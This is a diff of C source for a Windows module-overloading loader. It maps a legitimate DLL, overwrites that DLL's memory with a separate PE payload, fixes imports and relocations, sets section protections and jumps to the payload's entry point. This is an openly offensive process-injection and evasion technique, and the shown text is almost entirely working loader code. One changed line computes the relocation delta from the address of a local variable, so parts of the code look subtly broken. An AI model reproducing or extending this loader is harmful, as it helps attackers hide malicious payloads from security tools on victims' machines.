@@ -67,6 +67,48 @@ CLEANUP:
 
 }
 
+BOOL GrabPeHeader
+(
+	IN  LPVOID lpFile,
+	OUT PPEHEADERS pPe
+)
+
+{
+
+	PEHEADERS PeHeaders = { 0 };
+
+	PBYTE pBase = (PBYTE)lpFile;
+
+	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
+	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
+	{
+		PRINT_ERROR("Magic Letters");
+		return FALSE;
+	}
+
+	PIMAGE_NT_HEADERS64 pImgNt64 = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);
+	if (pImgNt64->Signature != IMAGE_NT_SIGNATURE)
+	{
+		PRINT_ERROR("Nt Signature");
+		return FALSE;
+	}
+
+
+	PeHeaders.pImgNt = pImgNt64;
+	PeHeaders.pImgSecHeader = IMAGE_FIRST_SECTION(PeHeaders.pImgNt);
+	PeHeaders.pImgDataDir = PeHeaders.pImgNt->OptionalHeader.DataDirectory;
+	PeHeaders.pImgDirEntryImport = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_IMPORT];
+	PeHeaders.pImgDirEntryBaseReloc = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+	PeHeaders.pImgDirEntryTls = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_TLS];
+	PeHeaders.pImgDirEntryException = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+	PeHeaders.pImgDirEntryExport = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+	*pPe = PeHeaders;
+
+	return TRUE;
+
+}
+
 BOOL MapDllFile
 (
 	IN LPCSTR DllFile,
@@ -238,43 +280,38 @@ BOOL FixIAT
 BOOL ChangeProtection
 (
 	IN PVOID TargetBaseAddress,
-	IN LPVOID lpFile
+	IN PEHEADERS PeHeader
 )
 {
 
-	PBYTE pBase = (PBYTE)lpFile;
-	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
-	PIMAGE_NT_HEADERS64 pImgNt = (PIMAGE_NT_HEADERS64)((DWORD_PTR)pBase + pImgDos->e_lfanew);
-	PIMAGE_SECTION_HEADER pImgSec = IMAGE_FIRST_SECTION(pImgNt);
-
-	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
+	for (int i = 0; i < PeHeader.pImgNt->FileHeader.NumberOfSections; i++)
 	{
 
 		DWORD dwProtection = 0;
 		DWORD dwOldProt = 0;
 
-		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+		if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
 			dwProtection = PAGE_EXECUTE;
-		
-		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ)
+
+		if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
 			dwProtection = PAGE_READONLY;
 
-		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
+		if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
 			dwProtection = PAGE_WRITECOPY;
 
-		if ((pImgSec[i].Characteristics & IMAGE_SCN_MEM_READ) && (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+		if ((PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ) && (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
 			dwProtection = PAGE_READWRITE;
 
-		if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+		if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
 		{
-			if (pImgSec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
+			if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
 				dwProtection = PAGE_EXECUTE_READWRITE;
 			else
 				dwProtection = PAGE_EXECUTE_READ;
 		}
 
-		PVOID BaseAddress = (PVOID)((PBYTE)TargetBaseAddress + pImgSec[i].VirtualAddress);
-		SIZE_T Size = pImgSec[i].SizeOfRawData;
+		PVOID BaseAddress = (PVOID)((PBYTE)TargetBaseAddress + PeHeader.pImgSecHeader[i].VirtualAddress);
+		SIZE_T Size = PeHeader.pImgSecHeader[i].SizeOfRawData;
 
 		if (!VirtualProtect(BaseAddress, Size, dwProtection, &dwOldProt))
 		{
@@ -319,7 +356,9 @@ BOOL OverwriteTargetDll
 BOOL ModuleOverload
 (
 	IN LPCSTR PePayload,
-	IN LPCSTR TargetDll
+	IN LPCSTR TargetDll,
+	IN LPVOID FileBuffer,
+	IN PEHEADERS PeHeader
 )
 {
 
@@ -327,39 +366,9 @@ BOOL ModuleOverload
 	PBYTE PeBaseAddress = 0;
 	PVOID DllBaseAddress = NULL;
 	SIZE_T ImageSize = 0;
-	PBYTE FileBuffer = 0;
-	DWORD NumberOfBytesToRead = 0;
 	DWORD dwOldProt = 0;
 
-	if (!ReadTargetFile(PePayload, &FileBuffer, &NumberOfBytesToRead))
-	{
-		WARN("Failed To Read and Get File Size of: %s", PePayload);
-		PRINT_ERROR("ReadTargetFile");
-		State = FALSE; goto CLEANUP;
-	}
-
 	INFO("Successfully Read Target File");
-
-
-	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)FileBuffer;
-	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
-	{
-		PRINT_ERROR("Magic Letters");
-		return FALSE;
-	}
-
-	PIMAGE_NT_HEADERS64 pImgNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)FileBuffer + pImgDos->e_lfanew);
-	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
-	{
-		PRINT_ERROR("Nt Signature");
-		return FALSE;
-	}
-
-	PIMAGE_DATA_DIRECTORY pImgDataDir = pImgNt->OptionalHeader.DataDirectory;
-	PIMAGE_SECTION_HEADER pImgSec = IMAGE_FIRST_SECTION(pImgNt);
-
-	DWORD RelocRva = pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
-	DWORD_PTR dwDelta = pImgNt->OptionalHeader.ImageBase;
 
 	if (!MapDllFile(TargetDll, &DllBaseAddress, &ImageSize))
 	{
@@ -371,32 +380,32 @@ BOOL ModuleOverload
 	INFO("Successfully Mapped DLL File");
 	INFO("%s Base Addess --> [0x%p] W/ a Size of --> [%zu]", TargetDll, DllBaseAddress, ImageSize);
 
-	if (!((PeBaseAddress = VirtualAlloc(NULL, pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))))
+	if (!((PeBaseAddress = VirtualAlloc(NULL, PeHeader.pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))))
 	{
-		WARN("Failed To Allocate %ld bytes to PeBaseAddress!", pImgNt->OptionalHeader.SizeOfImage);
+		WARN("Failed To Allocate %ld bytes to PeBaseAddress!", PeHeader.pImgNt->OptionalHeader.SizeOfImage);
 		PRINT_ERROR("VirtualAlloc");
 		return FALSE;
 	}
 
-	INFO("Allocated %ld bytes to PeBaseAddress!", pImgNt->OptionalHeader.SizeOfImage);
+	INFO("Allocated %ld bytes to PeBaseAddress!", PeHeader.pImgNt->OptionalHeader.SizeOfImage);
 
-	memcpy(PeBaseAddress, FileBuffer, pImgNt->OptionalHeader.SizeOfHeaders);
+	memcpy(PeBaseAddress, FileBuffer, PeHeader.pImgNt->OptionalHeader.SizeOfHeaders);
 
-	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
+	for (int i = 0; i < PeHeader.pImgNt->FileHeader.NumberOfSections; i++)
 	{
 
-		if (pImgSec->SizeOfRawData == 0)
+		if (PeHeader.pImgSecHeader->SizeOfRawData == 0)
 			continue;
 
 		memcpy(
-			(PVOID)(PeBaseAddress + pImgSec->VirtualAddress),
-			(PVOID)(FileBuffer + pImgSec->PointerToRawData),
-			pImgSec->SizeOfRawData
+			(PVOID)(PeBaseAddress + PeHeader.pImgSecHeader[i].VirtualAddress),
+			(PVOID)((PBYTE)FileBuffer + PeHeader.pImgSecHeader[i].PointerToRawData),
+			PeHeader.pImgSecHeader[i].SizeOfRawData
 		);
 
 	}
 
-	if (!FixIAT(pImgDataDir, PeBaseAddress))
+	if (!FixIAT(PeHeader.pImgDataDir, PeBaseAddress))
 	{
 		WARN("Failed To Fix Import Address Table!");
 		PRINT_ERROR("FixIAT");
@@ -405,7 +414,7 @@ BOOL ModuleOverload
 
 	OKAY("Fixed IAT");
 
-	if (!OverwriteTargetDll(DllBaseAddress, ImageSize, PeBaseAddress, pImgNt->OptionalHeader.SizeOfImage))
+	if (!OverwriteTargetDll(DllBaseAddress, ImageSize, PeBaseAddress, PeHeader.pImgNt->OptionalHeader.SizeOfImage))
 	{
 		WARN("Failed To Overwrite Memory Inside: %s", TargetDll);
 		PRINT_ERROR("OverwriteTargetDll");
@@ -414,7 +423,8 @@ BOOL ModuleOverload
 
 	OKAY("Overwrote Target DLL's Memory");
 
-	if (!fixReloc(RelocRva, DllBaseAddress, dwDelta))
+	DWORD_PTR dwDelta = (&DllBaseAddress - PeHeader.pImgNt->OptionalHeader.ImageBase);
+	if (!fixReloc(PeHeader.pImgDirEntryBaseReloc->VirtualAddress, DllBaseAddress, dwDelta))
 	{
 		WARN("Failed To Fix The Relocation Table!");
 		PRINT_ERROR("fixReloc");
@@ -423,7 +433,7 @@ BOOL ModuleOverload
 
 	INFO("Fixed Reloc Table");
 
-	if (!VirtualProtect(DllBaseAddress, pImgNt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwOldProt))
+	if (!VirtualProtect(DllBaseAddress, PeHeader.pImgNt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwOldProt))
 	{
 		WARN("Failed To Change Protections To PAGE_READONLY!");
 		PRINT_ERROR("VirtualProtect");
@@ -432,14 +442,14 @@ BOOL ModuleOverload
 
 	INFO("Changed Protection --> PAGE_READONLY");
 
-	if (!ChangeProtection(DllBaseAddress, FileBuffer))
+	if (!ChangeProtection(DllBaseAddress, PeHeader))
 	{
 		WARN("Failed To Change Memory Permissions!");
 		PRINT_ERROR("ChangeProtection");
 		State = FALSE; goto CLEANUP;
 	}
 
-	PBYTE EntryPoint = (PBYTE)(&DllBaseAddress + pImgNt->OptionalHeader.AddressOfEntryPoint);
+	PBYTE EntryPoint = (PBYTE)((PBYTE)DllBaseAddress + PeHeader.pImgNt->OptionalHeader.AddressOfEntryPoint);
 
 #ifdef DLL
 	PDLLMAIN pEntry = (PDLLMAIN)EntryPoint;
